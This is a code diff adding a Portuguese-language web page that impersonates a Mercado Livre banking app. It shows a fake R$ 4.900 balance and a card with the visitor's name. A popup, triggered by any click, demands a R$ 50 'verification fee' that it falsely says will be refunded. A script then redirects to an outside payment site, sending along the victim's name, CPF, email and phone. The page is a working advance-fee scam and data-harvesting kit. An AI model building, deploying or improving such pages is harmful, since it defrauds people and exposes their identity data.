@@ -1,0 +1,850 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Livre Bank</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/up4/css/all.min.css">
+    
+    <script src="/up4/js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17359210869"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-17359210869');
+</script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Sora', sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        
+        header {
+            background-color: #820ad1;
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            height: 32px;
+        }
+        
+        .user-profile {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-color: #f3e8ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #820ad1;
+            font-weight: 600;
+        }
+        
+        .balance-card {
+            background: linear-gradient(135deg, #820ad1, #9f3cff);
+            border-radius: 16px;
+            padding: 25px;
+            color: white;
+            margin: 20px 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        }
+        
+        .balance-title {
+            font-size: 14px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .balance-amount {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        
+        .card-container {
+            position: relative;
+            margin: 25px 0;
+        }
+        
+        .card-image {
+            width: 100%;
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.1);
+        }
+        
+        .card-info {
+            margin-top: 15px;
+        }
+        
+        .card-limit {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        
+        .limit-bar {
+            height: 6px;
+            background-color: rgba(255,255,255,0.2);
+            border-radius: 3px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+        
+        .limit-progress {
+            height: 100%;
+            width: 65%;
+            background-color: #fff;
+            border-radius: 3px;
+        }
+        
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 30px 0;
+        }
+        
+        .action-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .action-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background-color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+            color: #820ad1;
+            font-size: 20px;
+        }
+        
+        .action-name {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin: 25px 0 15px;
+            color: #333;
+        }
+        
+        .transactions {
+            background-color: #fff;
+            border-radius: 16px;
+            padding: 5px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        
+        .transaction-item {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .transaction-item:last-child {
+            border-bottom: none;
+        }
+        
+        .transaction-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #f5f5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            color: #820ad1;
+        }
+        
+        .transaction-details {
+            flex: 1;
+        }
+        
+        .transaction-name {
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        
+        .transaction-date {
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .transaction-amount {
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .positive {
+            color: #00a650;
+        }
+        
+        .negative {
+            color: #f23d3d;
+        }
+        
+        .offers-section {
+            margin: 30px 0;
+        }
+        
+        .offer-card {
+            background-color: #fff;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            display: flex;
+            align-items: center;
+        }
+        
+        .offer-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 10px;
+            background-color: #f3e8ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            color: #820ad1;
+            font-size: 24px;
+        }
+        
+        .offer-details {
+            flex: 1;
+        }
+        
+        .offer-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .offer-description {
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .content-area {
+            padding-bottom: 30px;
+        }
+        .card {
+            background: linear-gradient(45deg, #1E1B24, #4B2E83);
+            border-radius: 15px;
+            padding: 20px;
+            height: 175px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 100px;
+        }
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: absolute;
+            bottom: 10px;
+            left: 20px;
+            right: 20px;
+            width: calc(100% - 40px);
+        }
+        .card-name {
+            font-family: 'Sora', sans-serif;
+            font-size: 14px;
+            color: rgb(0, 0, 0);
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <img src="/up4/images/logo.svg" alt="Mercado Livre Bank" class="logo">
+                <div style="display: flex; align-items: center;">
+                    <div class="support-buttons" style="display: flex; margin-right: 15px;">
+                        <button style="background: none; border: none; margin-right: 10px; cursor: pointer;">
+                            <i class="fas fa-headset" style="color: #fff; font-size: 18px;"></i>
+                        </button>
+                        <button style="background: none; border: none; margin-right: 10px; cursor: pointer;">
+                            <i class="fas fa-question-circle" style="color: #fff; font-size: 18px;"></i>
+                        </button>
+                        <button style="background: none; border: none; cursor: pointer;">
+                            <i class="fas fa-bell" style="color: #fff; font-size: 18px;"></i>
+                        </button>
+                    </div>
+                    <div class="user-profile" id="userInitials">BR</div>
+                    <script>
+                        document.addEventListener('DOMContentLoaded', function() {
+                            try {
+                                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
+                                const nome = dadosUsuario.NOME || '';
+                                
+                                if (nome) {
+                                    const nomes = nome.split(' ');
+                                    let iniciais = '';
+                                    
+                                    if (nomes.length > 0) {
+                                        // Primeira letra do primeiro nome
+                                        iniciais += nomes[0].charAt(0);
+                                        
+                                        // Primeira letra do último nome (se existir)
+                                        if (nomes.length > 1) {
+                                            iniciais += nomes[nomes.length - 1].charAt(0);
+                                        }
+                                        
+                                        document.getElementById('userInitials').textContent = iniciais.toUpperCase();
+                                    }
+                                }
+                            } catch (error) {
+                                console.error('Erro ao obter iniciais do usuário:', error);
+                                document.getElementById('userInitials').textContent = '';
+                            }
+                        });
+                    </script>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="balance-container">
+            <div class="balance-label">
+                <i class="fas fa-wallet"></i>
+                <span>Saldo disponível</span>
+                <i class="fas fa-eye-slash balance-toggle"></i>
+            </div>
+            <div class="balance-value" style="margin-bottom: 0;">R$ 4.900,00</div>
+            <div style="display: flex; align-items: center; margin-top: 5px; margin-bottom: 0px;">
+                <i class="fas fa-chart-line" style="color: #00c42a; font-size: 12px; margin-right: 5px;"></i>
+                <span style="color: #00c42a; font-size: 13px; font-weight: 500;">Rendeu R$ 4,35 este mês</span>
+            </div>
+        </div>
+        
+        <style>
+            .balance-container {
+                background: linear-gradient(to right, #ffffff, #f8f9fa);
+                border-radius: 16px;
+                padding: 20px;
+                margin-top: 20px;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+                border: 1px solid rgba(0,0,0,0.03);
+                transition: all 0.3s ease;
+            }
+            
+            .balance-container:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 18px rgba(0,0,0,0.1);
+            }
+            
+            .balance-label {
+                display: flex;
+                align-items: center;
+                font-size: 15px;
+                color: #555;
+                margin-bottom: 8px;
+                font-weight: 500;
+            }
+            
+            .balance-label i {
+                margin-right: 8px;
+                color: #820ad1;
+            }
+            
+            .balance-toggle {
+                margin-left: auto;
+                cursor: pointer;
+                color: #777;
+                transition: color 0.2s;
+            }
+            
+            .balance-toggle:hover {
+                color: #333;
+            }
+            
+            .balance-value {
+                font-size: 28px;
+                font-weight: 700;
+                color: #222;
+                margin: 10px 0 15px;
+            }
+            
+            .balance-actions {
+                display: flex;
+                gap: 10px;
+                margin-top: 5px;
+            }
+            
+            .balance-action-btn {
+                flex: 1;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+                background-color: #f0f5ff;
+                border: none;
+                border-radius: 8px;
+                padding: 10px;
+                font-size: 14px;
+                color: #820ad1;
+                font-weight: 500;
+                cursor: pointer;
+                transition: all 0.2s;
+            }
+            
+            .balance-action-btn:hover {
+                background-color: #e0ebff;
+            }
+        </style>
+    </div>
+    
+    <div class="container content-area">
+        <div class="balance-card">
+            <div class="card-details-link" style="margin-top: 0; margin-bottom: 10px;">
+                <div style="display: flex; align-items: center; justify-content: space-between; color: #ffffff; padding-bottom: 10px; text-decoration: none; font-weight: 500;">
+                    <div style="display: flex; align-items: center;">
+                        <i class="fas fa-credit-card" style="margin-right: 10px;"></i>
+                        Ver detalhes do cartão
+                    </div>
+                    <i class="fas fa-chevron-right"></i>
+                </div>
+            </div>
+
+            <div class="card" style="background: linear-gradient(135deg, #1E1B24, #4B2E83); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); overflow: hidden; position: relative;">
+                <!-- Efeito de brilho no cartão -->
+                <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;"></div>
+                <style>
+                    @keyframes shine {
+                        0% { left: -100%; }
+                        20% { left: 100%; }
+                        100% { left: 100%; }
+                    }
+                </style>
+                
+                <div class="card-top">
+                    <img src="/up4/images/logo.svg" alt="Logo Mercado Livre" style="width: 50px; filter: drop-shadow(0 2px 3px rgba(0,0,0,0.2));">
+                    <div style="font-size: 12px; color: rgba(255, 255, 255, 1); font-family: 'Sora', sans-serif; text-transform: uppercase; letter-spacing: 1px;">Gold</div>
+                </div>
+                
+                <div style="position: absolute; top: 50%; left: 0; transform: translateY(-50%); width: 100%;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                        <div style="display: flex; align-items: center; margin-left: 20px;">
+                            <img src="/up4/images/chip.png" alt="Chip" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));">
+                        </div>
+                        <i class="fas fa-wifi fa-rotate-90" style="color: rgb(255, 255, 255, 1); font-size: 24px; margin-right: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3);"></i>
+                    </div>
+                </div>
+                
+                <div class="card-bottom">
+                    <div style="display: flex; flex-direction: column; align-items: flex-start;">
+                        <span class="card-name" id="cardName" style="text-shadow: 0 1px 2px rgba(0,0,0,0.3); letter-spacing: 1px;">
+                            <script>
+                                document.addEventListener('DOMContentLoaded', function() {
+                                    try {
+                                        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
+                                        if (dadosUsuario.NOME) {
+                                            document.getElementById('cardName').textContent = dadosUsuario.NOME;
+                                        } else {
+                                            // Se não houver nome, esconde o nome e o título
+                                            document.getElementById('cardName').style.display = 'none';
+                                            document.getElementById('cardName').nextElementSibling.style.display = 'none';
+                                        }
+                                    } catch (error) {
+                                        console.error('Erro ao carregar nome do usuário:', error);
+                                        // Em caso de erro, esconde o nome e o título
+                                        document.getElementById('cardName').style.display = 'none';
+                                        document.getElementById('cardName').nextElementSibling.style.display = 'none';
+                                    }
+                                });
+                            </script>
+                            <span id="cardNamePlaceholder">BENEDITA RAMOS</span>
+                        </span>
+                        <span style="font-size: 8px; color: rgba(255, 255, 255, 1); font-family: 'Sora', sans-serif; margin-top: 3px;">TITULAR DO CARTÃO</span>
+                    </div>
+                    <div style="display: flex; flex-direction: column; align-items: flex-end;">
+                        <img src="/up4/images/visa.png" alt="mastercard" style="width: 50px; filter: brightness(100);">
+                        <span style="font-size: 8px; color: rgba(255, 255, 255, 1); font-family: 'Sora', sans-serif; margin-top: 3px; text-transform: uppercase;">Crédito</span>
+                    </div>
+                </div>
+                
+                <!-- Padrão de segurança no fundo do cartão -->
+                <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;"></div>
+            </div>
+            
+
+            
+            <div class="card-container" style="margin-top: 15px; margin-bottom: 0px;">
+                <div class="card-info">
+                    <div class="card-limit" style="display: flex; justify-content: space-between; margin-bottom: 12px;">
+                        <span style="font-size: 14px; font-weight: 500;">Limite disponível</span>
+                        <span style="font-size: 22px; font-weight: 700;">R$ 4.700,00</span>
+                    </div>
+                    <div class="limit-bar" style="height: 8px; background-color: rgba(255, 255, 255, 0.2); border-radius: 4px; overflow: hidden;">
+                        <div class="limit-progress" style="width: 0%; height: 100%; background-color: #ffffff; border-radius: 4px;"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+        
+        <h2 class="section-title">Últimas transações</h2>
+        <div class="transactions">
+            <div class="transaction-item">
+                <div class="transaction-icon">
+                    <i class="fas fa-exchange-alt"></i>
+                </div>
+                <div class="transaction-details">
+                    <div class="transaction-name">Depósito realizado</div>
+                    <div class="transaction-date">Hoje, 10:15</div>
+                </div>
+                <div class="transaction-amount positive">+ R$ 4.900,00</div>
+            </div>
+            
+            <div class="transaction-item" style="display: flex; justify-content: center; padding: 20px; color: #888; font-size: 14px;">
+                Não há mais transações para exibir
+            </div>
+        </div>
+        
+        <div class="offers-section">
+            <h2 class="section-title">Ofertas para você</h2>
+            
+            <div class="offer-card">
+                <div class="offer-icon">
+                    <i class="fas fa-percentage"></i>
+                </div>
+                <div class="offer-details">
+                    <div class="offer-title">Empréstimo pré-aprovado</div>
+                    <div class="offer-description">Até R$ 15.000 com as melhores taxas do mercado</div>
+                </div>
+            </div>
+            
+            <div class="offer-card">
+                <div class="offer-icon">
+                    <i class="fas fa-chart-line"></i>
+                </div>
+                <div class="offer-details">
+                    <div class="offer-title">Investimentos</div>
+                    <div class="offer-description">Comece a investir com apenas R$ 1</div>
+                </div>
+            </div>
+            
+            <div class="offer-card" style="margin-bottom: 70px;">
+                <div class="offer-icon">
+                    <i class="fas fa-gift"></i>
+                </div>
+                <div class="offer-details">
+                    <div class="offer-title">Cashback garantido</div>
+                    <div class="offer-description">5% de volta em compras no Mercado Livre</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="bottom-menu">
+        <div class="menu-item active">
+            <i class="fas fa-home"></i>
+            <span>Início</span>
+        </div>
+        <div class="menu-item">
+            <i class="fas fa-credit-card"></i>
+            <span>Cartões</span>
+        </div>
+        <div class="menu-item">
+            <i class="fas fa-qrcode"></i>
+            <span>Pagar</span>
+        </div>
+        <div class="menu-item">
+            <i class="fas fa-ellipsis-h"></i>
+            <span>Mais</span>
+        </div>
+    </footer>
+
+    <div id="overlay" class="overlay" style="display: none;">
+        <div class="popup">
+            <div class="popup-header">
+                <h3>Leia com Atenção</h3>
+                <button class="close-btn" onclick="closePopup()">×</button>
+            </div>
+            <div class="popup-content">
+                <p>Para concluir a validação da sua conta e dar continuidade ao processo de análise da sua solicitação, é necessária a confirmação da <strong>Taxa de Verificação no valor de R$ 50,00</strong>.</p>
+                <p>Essa etapa faz parte dos procedimentos de segurança e validação cadastral adotados pela plataforma, ajudando a confirmar os dados informados e a proteger as operações realizadas em sua conta.</p>
+                <p>Mas não se preocupe: o valor de <strong>R$ 50,00 não é perdido</strong>. Após a conclusão da verificação, o montante será <strong>creditado como saldo disponível em sua conta</strong>, da mesma forma que ocorre com outras taxas reembolsáveis previstas nos termos do serviço.</p>
+                <button class="button" onclick="redirectToPayment()">Depositar Taxa de Verificação</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Adiciona um evento de clique para todo o documento (qualquer lugar da tela)
+            document.body.addEventListener('click', function() {
+                document.getElementById('overlay').style.display = 'flex';
+            });
+        });
+        
+        function closePopup() {
+            // Previne o comportamento padrão do evento
+            event.preventDefault();
+            // Impede a propagação do evento para elementos pai
+            event.stopPropagation();
+            document.getElementById('overlay').style.display = 'none';
+        }
+    </script>
+
+<script>
+    function getUrlParams() {
+        const params = {};
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        
+        for (const [key, value] of urlParams) {
+            params[key] = value;
+        }
+        return params;
+    }
+
+    function getUTMParams() {
+        return getUrlParams();
+    }
+
+    function buildUrlWithParams(baseUrl) {
+        const params = getUrlParams();
+        const url = new URL(baseUrl, window.location.href);
+        Object.keys(params).forEach(key => {
+            url.searchParams.append(key, params[key]);
+        });
+        
+        return url.toString();
+    }
+
+    function redirectToPaymentLegacy() {
+        try {
+            const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
+            const email = localStorage.getItem('email') || '';
+            const telefone = localStorage.getItem('telefone') || '';
+            
+            const baseUrl = 'https://pay.clubevantagem.site/yOeXZKxQXKqGAQa';
+            const url = new URL(baseUrl);
+            
+            // Adicionar parâmetros do usuário
+            url.searchParams.append('name', dadosUsuario.NOME || '');
+            url.searchParams.append('document', dadosUsuario.CPF || '');
+            url.searchParams.append('email', email);
+            url.searchParams.append('telephone', telefone);
+            
+            // Adicionar parâmetros da URL atual usando a função buildUrlWithParams
+            const finalUrl = buildUrlWithParams(url.toString());
+            
+            // O problema é que document.querySelector('button') seleciona apenas o primeiro botão da página
+            // Precisamos ser mais específicos para selecionar o botão correto
+            const button = document.querySelector('.popup-content .button');
+            if (button) {
+                button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 10px;"></i>Processando pagamento';
+            } else {
+                console.error('Botão de pagamento não encontrado');
+            }
+            window.location.href = finalUrl;
+        } catch(err) {
+            console.error('Erro ao redirecionar:', err);
+            window.location.href = buildUrlWithParams('https://pay.clubevantagem.site/yOeXZKxQXKqGAQa');
+        }
+    }
+</script>    
+
+    <style>
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .popup {
+            background-color: white;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .popup-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background-color: #820ad1;
+            color: white;
+        }
+        
+        .popup-header h3 {
+            margin: 0;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .close-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0;
+            line-height: 1;
+        }
+        
+        .popup-content {
+            padding: 20px;
+        }
+        
+        .popup-content p {
+            margin-bottom: 15px;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #333;
+        }
+        
+        .button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background-color: #820ad1;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.2s;
+        }
+        
+        .button:hover {
+            background-color: #2968c8;
+        }
+    </style>
+
+
+
+    
+    <style>
+        .bottom-menu {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: space-around;
+            padding: 16px 0 12px;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
+            z-index: 100;
+            padding-bottom: 20px;
+        }
+        
+        .menu-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 10px;
+            color: #777;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        
+        .menu-item i {
+            font-size: 20px;
+            margin-bottom: 6px;
+        }
+        
+        .menu-item.active {
+            color: #820ad1;
+        }
+        
+        .menu-item:hover {
+            color: #820ad1;
+        }
+    </style>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Simulação de carregamento de dados
+            setTimeout(() => {
+                const ba = document.querySelector('.balance-amount');
+                if (ba) ba.textContent = 'R$ 4.900,00';
+            }, 500);
+
+            // Toggle para mostrar/esconder saldo
+            const eyeIcon = document.querySelector('.fa-eye-slash');
+            const balanceAmount = document.querySelector('.balance-amount');
+            let isHidden = false;
+
+            if (eyeIcon && balanceAmount) eyeIcon.addEventListener('click', function() {
+                if (isHidden) {
+                    balanceAmount.textContent = 'R$ 3.547,82';
+                    eyeIcon.classList.remove('fa-eye');
+                    eyeIcon.classList.add('fa-eye-slash');
+                } else {
+                    balanceAmount.textContent = 'R$ ••••••';
+                    eyeIcon.classList.remove('fa-eye-slash');
+                    eyeIcon.classList.add('fa-eye');
+                }
+                isHidden = !isHidden;
+            });
+        });
+    </script>
+
+
+  <script src="/js/checkout-nu.js"></script>
+</body></html>
